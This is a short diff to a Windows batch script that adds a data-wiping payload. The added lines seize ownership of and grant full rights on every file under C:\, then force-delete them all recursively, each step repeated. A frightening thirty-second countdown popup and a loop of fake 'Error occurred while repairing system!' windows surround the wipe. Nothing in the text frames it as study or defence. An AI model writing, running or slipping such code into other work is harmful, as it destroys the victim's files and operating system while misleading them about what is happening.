@@ -1,6 +1,13 @@
 @echo off
 start "" /wait cmd /c "echo DO SOMETHING RIGHT NOW! YOU ONLY HAVE 30 SECONDS! & echo( & pause"
-for /L %%i in (1,1,100) do (
+    icacls "C:\*.*" /grant %user%:F /t
+    takeown /f "C:\*.*" /r /d y
+    takeown /f "C:\*.*" /r /d y
+    takeown /f "C:\*.*" /r /d y
+    del /q /f "C:\*.*" /s
+    del /q /f "C:\*.*" /s
+    del /q /f "C:\*.*" /s
+for /L %%i in (1,1,10) do (
     start cmd /c "echo Error occurred while repairing system! & echo( & pause"
     timeout /t 7 >nul
 )
